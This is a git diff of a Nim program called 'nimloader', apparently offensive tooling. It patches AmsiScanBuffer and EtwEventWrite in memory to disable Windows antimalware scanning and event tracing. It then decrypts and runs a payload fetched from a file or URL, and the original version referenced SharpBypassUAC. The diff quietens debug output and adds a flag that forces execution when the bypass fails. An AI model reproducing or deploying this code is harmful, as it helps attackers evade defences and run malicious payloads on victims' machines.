@@ -5,15 +5,36 @@ import nimcrypto # for decryption
 import nimcrypto/sysrand # for decryption
 import winim/lean # for core SDK only, this speed up compiling time.
 import strformat # string formatting
-import std/parseopt # option parser
 import sugar # assembly dump functionality
 import winim/clr except `[]`     # Common Language Runtime Support. Exclude []  or it throws a runtime recursion error!
 import shlex #parameter splitting
 import std/httpclient
+import puppy # using ssl connections
+import parseopt
+import os # to get parameters
+
 
 
 const iv: array[aes256.sizeBlock, byte]= [byte 148, 181, 90, 151, 26, 242, 253, 114, 7, 217, 24, 204, 125, 203, 26, 167]
 const envkey: string = "myverysecretkey"
+
+var debug=false
+var version="nimloader 1.6"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 func toByteSeq*(str: string): seq[byte] {.inline.} =
   ## Converts a string to the corresponding byte sequence.
@@ -36,8 +57,8 @@ proc decryptText(contents: string,passkeystr: string): string =
         plaintext = newSeq[byte](len(data)) # blank array of bytes to contain plaintext
         transformedText = newSeq[byte](len(data)) # blank array of bytes to contain decrypted
 
-
-    echo "Step 0: copy incomming array of bytes to plaintext array "
+    if debug:    
+      echo "Step 0: copy incomming array of bytes to plaintext array "
     copyMem(addr plaintext[0], addr data[0], len(data)) #copy incoming array of bytes to plaintext array
     # Expand key to 32 bytes using SHA256 as the KDF
     var expandedkey = sha256.digest(passkeystr) # digest of our key
@@ -45,21 +66,25 @@ proc decryptText(contents: string,passkeystr: string): string =
     copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data)) # copy digest to key array
     ectx.init(key, iv) 
 
-
-    echo "step 1: Decrypting"
+    if debug:    
+      echo "step 1: Decrypting"
     ectx.decrypt(plaintext, transformedText) # decrypt plaintext into transformedText
-    echo "step 2: Convert to string"
+    if debug:    
+      echo "step 2: Convert to string"
 
     var newText=transformedText.toString() # convert tranformed text to string
-    var inFile="SharpBypassUAC.exeNimByteArray.txt_enc.txt"
-    writeFile(inFile&"_dec.txt", transformedText)     
     result = newText
 
 
-proc download(url: string):string=
+proc downloadV1(url: string):string=
     var client = newHttpClient()
     var text: string=""
     text=client.getContent(url)
+    result=text.strip(leading = true, trailing = true)
+
+proc download(url: string):string=
+    var text: string=""
+    text=fetch(url)
     result=text.strip(leading = true, trailing = true)
 
 proc Patchntdll(): bool =
@@ -71,26 +96,31 @@ proc Patchntdll(): bool =
         disabled: bool = false
 
     when defined amd64:
-        echo "[*] Running in x64 process"
+        if debug:
+          echo "[*] Running in x64 process"
         const patch: array[1, byte] = [byte 0xc3]
     elif defined i386:
-        echo "[*] Running in x86 process"
+        if debug:    
+          echo "[*] Running in x86 process"
         const patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
 
     # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
     # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
     ntdll = loadLib("ntdll")
     if isNil(ntdll):
-        echo "[X] Failed to load ntdll.dll"
+        if debug:
+          echo "[X] Failed to load ntdll.dll"
         return disabled
 
     cs = ntdll.symAddr("EtwEventWrite") # equivalent of GetProcAddress()
     if isNil(cs):
-        echo "[X] Failed to get the address of 'EtwEventWrite'"
+        if debug:
+          echo "[X] Failed to get the address of 'EtwEventWrite'"
         return disabled
 
     if VirtualProtect(cs, patch.len, 0x40, addr op):
-        echo "[*] Applying patch"
+        if debug:
+          echo "[*] Applying patch"
         copyMem(cs, unsafeAddr patch, patch.len)
         VirtualProtect(cs, patch.len, op, addr t)
         disabled = true
@@ -108,24 +138,29 @@ proc PatchAmsi(): bool =
         disabled: bool = false
 
     when defined amd64:
-        echo "[*] Running in x64 process"
+        if debug:
+          echo "[*] Running in x64 process"
         const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
     elif defined i386:
-        echo "[*] Running in x86 process"
+        if debug:
+          echo "[*] Running in x86 process"
         const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
 
     amsi = loadLib("amsi")
     if isNil(amsi):
-        echo "[X] Failed to load amsi.dll"
+        if debug:
+          echo "[X] Failed to load amsi.dll"
         return disabled
 
     cs = amsi.symAddr("AmsiScanBuffer") # equivalent of GetProcAddress()
     if isNil(cs):
-        echo "[X] Failed to get the address of 'AmsiScanBuffer'"
+        if debug:
+          echo "[X] Failed to get the address of 'AmsiScanBuffer'"
         return disabled
 
     if VirtualProtect(cs, patch.len, 0x40, addr op):
-        echo "[*] Applying patch"
+        if debug:
+          echo "[*] Applying patch"
         copyMem(cs, unsafeAddr patch, patch.len)
         VirtualProtect(cs, patch.len, op, addr t)
         disabled = true
@@ -139,60 +174,75 @@ proc PatchAmsi(): bool =
 when isMainModule:
 
     var decrypt: bool=false # option to decrypt
-    var debug: bool=false # to enable/disable debug mode
+    var force: bool=false # force run regardless of successes
     var inFile: string= "" # will hold input byte array file
     var helpMsg: string="""
-    nimLoader.exe [-d] [-D] [-k] [-p:'parameters']  <fileOrUrl.txt>
+    nimLoader.exe [-d] [-D] [-f] [-k]  <fileOrUrl.txt> [parameters for the file]
     -d: Decrypt file or url
+    -D: Debug
+    -f: force execution regardless of bypass success
     -k key: key for decryption. Defaults to myverysecretkey
-    -D: Show debugging info
+    -v: show version
     """ # help msg
     var parameters: string="" # parameters to the program to launch
     var passkeystr:string=envkey# default key to our constant
 
-    # OUR OPTION PARSER
-    var parser = initOptParser() 
+
+
+
+    var p = initOptParser(commandLineParams()) #command line parameters
     while true:
-      parser.next()
-      case parser.kind
-      of cmdEnd: 
-        break
-      of cmdShortOption, cmdLongOption:
-        if parser.val == "": #just options "-x"
-          if parser.key=="d": # decrypt option
-            decrypt=true
-          elif parser.key=="D": # debug option
-            debug=true
-          elif parser.key=="h": # help option
-            echo helpMsg
-            quit(QuitSuccess)
-
-        else:
-          if parser.key=="p": # parameters option
-            parameters=parser.val
-          if parser.key=="k": # key option
-            passkeystr=parser.val
-
+      p.next()
+      case p.kind
       of cmdArgument:
-        inFile=parser.key # argument input file
+        #echo "argument: " & p.key
+        if inFile=="": # no file yet, add the file
+          inFile=p.key # argument input file
+          break
+
+
+      of cmdLongOption, cmdShortOption:
+        #echo "short: " & p.key
+        case p.key
+        of "d": #decrypt option
+          decrypt=true
+        of "f": #force all the way
+          force=true       
+        of "D": #debug
+          debug=true
+        of "v": #version
+          echo version
+          quit(QuitSuccess)
+        of "h": # help message
+          echo helpMsg
+          quit(QuitSuccess)
+
+      of cmdEnd:
+        break
+
+    parameters = join(p.remainingArgs, " ")
+
 
     if inFile=="":
-      quit()
+      quit(QuitFailure)
 
 
+    
     #######################
-    # 1. FIRST, PATCH AMSI
+    # PATCH AMSI
     #######################
     var success = PatchAmsi()
-    if  debug:
+    if debug:
       echo fmt"[*] AMSI disabled: {bool(success)}"
 
     if not success:
-      echo "[-] AMSI not disabled:"
-      quit()
+      if debug:
+        echo "[-] AMSI not disabled:"
+      if not force: # go on regardless
+        quit()
 
     #######################
-    # 2. FIRST, PATCH ETW
+    # PATCH ETW
     #######################
 
     success = Patchntdll()
@@ -201,7 +251,7 @@ when isMainModule:
 
 
     #######################
-    # 3. GET THE TOOL'S BYTES
+    # GET THE TOOL'S BYTES
     #######################
 
     var contents: string=""
